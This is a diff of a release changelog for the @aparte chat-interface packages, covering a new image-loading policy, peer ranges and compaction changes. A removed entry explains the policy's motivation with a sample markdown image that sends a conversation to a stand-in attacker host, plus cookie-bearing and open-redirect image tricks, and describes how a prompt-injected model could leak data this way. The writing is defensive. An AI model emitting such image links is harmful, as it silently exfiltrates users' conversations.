@@ -14,7 +14,7 @@ Every `@aparte/*` package ships at this version (they are released in lockstep).
 
   - **What most apps change.** A picture a model or a tool chose waits for a click unless `aparteGlobalConfig.setImagePolicy` allows where it comes from. The names the beta marked deprecated are removed. A `CompactionTarget` needs `updateMessage`.
   - **What is frozen.** Elements and the attributes they document, event names, the functions, classes and constants each package's main entry exports, the keys of `AparteLocale` and the `--aparte-*` token names — and what each one's documentation says it does, its defaults included. A frozen name leaves only after a notice in a minor, in the next major. [Stability](https://apartejs.dev/reference/stability/) lists every name, and what is not frozen: methods, interface fields, type names, class names, how a default looks.
-  - **Peer ranges.** Each `@aparte` package asks for the others at `>=1.0.0 <2.0.0`, so a 0.x package beside a 1.x one is a peer conflict your package manager reports.
+  - **Peer ranges.** Every package that builds on `@aparte/core` asks for it at `>=1.0.0 <2.0.0`, so a 0.x package beside a 1.x one is a peer conflict your package manager reports.
   - **Security.** Only the latest 1.x release receives security fixes. [SECURITY.md](https://github.com/apartejs/aparte/blob/main/SECURITY.md) says how to report a vulnerability and how soon you hear back.
   <sub>`@aparte/core`</sub>
 
@@ -35,23 +35,12 @@ Every `@aparte/*` package ships at this version (they are released in lockstep).
   - **In a card.** `@aparte/plugin-cards` draws a card without the pictures the policy held, and one "Show images" button with every host they would load from beside it; pressing it draws them. A card of your own asks through `ctx.image(src, props)` and `ctx.loads(url)`.
   - **The rule.** `setImagePolicy` takes a list (`'self'`, `'*'`, origins) or a function `(url) => 'load' | 'hold' | 'drop'`. `config.decideImage(url)` answers for a plugin that draws pictures itself, and `config.showImage(url)` records the reader's choice. Every picture that loads goes with `referrerpolicy="no-referrer"`. A CSP `img-src` is the stronger rule beside it: it also checks where a redirect leads.
   - Two locale keys, `imageLoad` and `imageLoadNamed`, name a held picture; `@aparte/locales` carries them in its nine languages.
-  <sub>`@aparte/core`, `@aparte/plugin-cards`, `@aparte/plugin-streaming-markdown`</sub>
+  <sub>`@aparte/core`, `@aparte/plugin-cards`, `@aparte/plugin-streaming-markdown`, `@aparte/locales`</sub>
 
 - [f5080e9](https://github.com/apartejs/aparte/commit/f5080e9): A `CompactionTarget` must have `updateMessage`, and the type now says so; `clearAll` and `appendMessage` leave it. The `window` of an `aparte-compact` request is no longer read: set `contextWindow`.
 
   Since 0.26.0 a compaction writes one checkpoint through `updateMessage` and calls nothing else, so a target without it already failed at run time ("This chat cannot hold a checkpoint") while the type called it optional. The `window` a context gauge sent with its request was read as a last resort "for one more release" from 0.26.0; the gauge no longer sends one.
   <sub>`@aparte/plugin-compaction`</sub>
-
-### Minor Changes
-
-- [67efebe](https://github.com/apartejs/aparte/commit/67efebe): A picture a model or a tool chose no longer loads by itself: `data:` and `blob:` pictures do, and any other shows as a link naming its host until the reader clicks it. To load your own, call `aparteGlobalConfig.setImagePolicy(['self', 'https://cdn.example.com'])`; `['*']` loads every picture, as before.
-
-  - **Why.** A picture fetches its address the moment it is shown, before anyone reads the reply, and a prompt-injected model can write the conversation into that address: `![](https://attacker.example/c.png?d=…)` sent it, the reader's IP and their browser to that host with no click — while the reply streamed, and again each time the conversation was shown. The page's own site is not trusted by default either: its pictures carry the reader's cookies (`![](/api/logout)`), and an open redirect on it turns a picture from the site into a picture from anywhere.
-  - **In a reply.** A held picture is a small link that says where it would load from (inside a link of the reply's own, a button, so that link stays whole). A click loads it in place, and the chat remembers the choice; a click with a modifier key is left to the browser, as for any link. `config.sanitizeHtml` applies the policy after whichever sanitizer is set, so DOMPurify or your own keeps it, and `@aparte/plugin-streaming-markdown` applies it before any `src` is set, so nothing is fetched while a reply streams. A picture's own address decides; of its `srcset`, only the candidates that load are kept, written again so a browser can only pick an address that was judged.
-  - **In a card.** `@aparte/plugin-cards` draws a card without the pictures the policy held, and one "Show images" button with every host they would load from beside it; pressing it draws them. A card of your own asks through `ctx.image(src, props)` and `ctx.loads(url)`.
-  - **The rule.** `setImagePolicy` takes a list (`'self'`, `'*'`, origins) or a function `(url) => 'load' | 'hold' | 'drop'`. `config.decideImage(url)` answers for a plugin that draws pictures itself, and `config.showImage(url)` records the reader's choice. Every picture that loads goes with `referrerpolicy="no-referrer"`. A CSP `img-src` is the stronger rule beside it: it also checks where a redirect leads.
-  - Two locale keys, `imageLoad` and `imageLoadNamed`, name a held picture; `@aparte/locales` carries them in its nine languages.
-  <sub>`@aparte/locales`</sub>
 
 ### Patch Changes
 
